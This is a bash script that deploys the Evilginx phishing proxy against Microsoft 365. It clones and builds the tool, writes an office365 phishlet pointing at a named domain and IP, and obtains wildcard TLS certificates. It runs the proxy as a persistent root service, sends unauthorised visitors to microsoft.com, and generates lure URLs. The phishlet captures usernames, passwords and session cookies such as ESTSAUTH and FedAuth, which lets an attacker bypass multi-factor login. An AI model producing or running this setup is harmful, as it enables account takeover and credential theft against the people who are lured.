#!/bin/bash
set -euo pipefail

DOMAIN="hrahra.org"
SUBDOMAIN="securelogin.hrahra.org"
EXTERNAL_IP="134.199.198.228"
EVILGINX_DIR="/opt/posh-ai/evilginx3"
GO_VERSION="1.21.5"
NGINX_CONF="/etc/nginx/sites-available/evilginx"
NGINX_ENABLED="/etc/nginx/sites-enabled/evilginx"
SERVICE_FILE="/etc/systemd/system/evilginx3.service"
PHISHLET_FILE="$EVILGINX_DIR/phishlets/office365.yaml"

export DEBIAN_FRONTEND=noninteractive

echo "Starting enterprise-grade Evilginx3 deployment..."

apt update -qq
apt install -y wget curl git build-essential nginx certbot python3-certbot-nginx unzip jq python3-yaml

if ! command -v go &> /dev/null; then
    wget -q https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz
    rm -rf /usr/local/go
    tar -C /usr/local -xzf go${GO_VERSION}.linux-amd64.tar.gz
    echo 'export PATH=$PATH:/usr/local/go/bin' >> /etc/profile
    export PATH=$PATH:/usr/local/go/bin
    rm go${GO_VERSION}.linux-amd64.tar.gz
fi

mkdir -p /opt/posh-ai
cd /opt/posh-ai

if [ -d "evilginx3" ]; then
    systemctl stop evilginx3 2>/dev/null || true
    rm -rf evilginx3
fi

git clone https://github.com/kgretzky/evilginx2.git evilginx3
cd evilginx3
/usr/local/go/bin/go build -o evilginx main.go

mkdir -p phishlets

cat > "$PHISHLET_FILE" <<'EOF'
name: 'office365'
author: '@enterprise'
min_ver: '3.0.0'
proxy_hosts:
  - phish_sub: 'securelogin'
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    session: true
    is_landing: true
  - phish_sub: 'securelogin'
    orig_sub: 'www'
    domain: 'office.com'
    session: false
    is_landing: false
sub_filters:
  - triggers_on: 'login.microsoftonline.com'
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    search: 'login\.microsoftonline\.com'
    replace: 'securelogin.hrahra.org'
    mimes:
      - 'text/html'
      - 'application/json'
      - 'application/javascript'
      - 'text/javascript'
auth_tokens:
  - domain: '.microsoftonline.com'
    keys:
      - 'ESTSAUTH'
      - 'ESTSAUTHPERSISTENT'
      - 'ESTSAUTHLIGHT'
  - domain: '.office.com'
    keys:
      - 'rtFa'
      - 'FedAuth'
auth_urls:
  - url: '/common/oauth2/authorize'
    domain: 'login.microsoftonline.com'
  - url: '/common/oauth2/v2.0/authorize'
    domain: 'login.microsoftonline.com'
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/authorize'
force_post:
  - path: '/common/SAS/ProcessAuth'
    search: 'login\.microsoftonline\.com'
    replace: 'securelogin.hrahra.org'
    type: 'body'
EOF

systemctl stop nginx 2>/dev/null || true
certbot certonly --standalone --non-interactive --agree-tos --email admin@$DOMAIN -d $DOMAIN -d "*.$DOMAIN"

cat > "$NGINX_CONF" <<EOF
server {
    listen 80;
    server_name $SUBDOMAIN;
    return 301 https://\$server_name\$request_uri;
}

server {
    listen 443 ssl http2;
    server_name $SUBDOMAIN;
    
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    
    location / {
        proxy_pass https://127.0.0.1:8443;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_ssl_verify off;
    }
}
EOF

ln -sf "$NGINX_CONF" "$NGINX_ENABLED"

cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Evilginx3 Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$EVILGINX_DIR
ExecStart=$EVILGINX_DIR/evilginx -p $EVILGINX_DIR/phishlets
Restart=always
RestartSec=3
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

echo "0 0,12 * * * /usr/bin/certbot renew --quiet --deploy-hook 'systemctl reload nginx'" | crontab -

cat > $EVILGINX_DIR/config.json <<EOF
{
  "blacklist": {
    "mode": "unauth"
  },
  "general": {
    "autocert": false,
    "bind_ipv4": "127.0.0.1",
    "dns_port": 53,
    "domain": "$DOMAIN",
    "external_ipv4": "$EXTERNAL_IP",
    "https_port": 8443,
    "ipv4": "$EXTERNAL_IP",
    "unauth_url": "https://www.microsoft.com"
  },
  "phishlets": {}
}
EOF

systemctl daemon-reload
systemctl enable evilginx3
systemctl start nginx
systemctl start evilginx3

sleep 10

cat > /tmp/evilginx_config.txt <<EOF
config domain $DOMAIN
config ipv4 external $EXTERNAL_IP
phishlets hostname office365 $SUBDOMAIN
phishlets enable office365
lures create office365
lures get-url 0
sessions
exit
EOF

timeout 30 $EVILGINX_DIR/evilginx -p $EVILGINX_DIR/phishlets < /tmp/evilginx_config.txt || true

rm -f /tmp/evilginx_config.txt

cat > /usr/local/bin/evilginx-status.sh <<'EOF'
#!/bin/bash
echo "=== Evilginx3 Enterprise Status ==="
echo "Service Status: $(systemctl is-active evilginx3)"
echo "Nginx Status: $(systemctl is-active nginx)"
echo "SSL Certificate: $(openssl x509 -enddate -noout -in /etc/letsencrypt/live/hrahra.org/fullchain.pem 2>/dev/null | cut -d= -f2 || echo 'Not found')"
echo "Listening Ports:"
netstat -tlnp | grep -E ':(80|443|8443|53)\s'
echo "Recent Logs:"
journalctl -u evilginx3 --no-pager -n 5
EOF

chmod +x /usr/local/bin/evilginx-status.sh

echo "Deployment complete!"
echo "Domain: $SUBDOMAIN"
echo "IP: $EXTERNAL_IP"
echo "Status: /usr/local/bin/evilginx-status.sh"
echo "Logs: journalctl -u evilginx3 -f"
echo "Control: systemctl {start|stop|restart|status} evilginx3"

/usr/local/bin/evilginx-status.sh
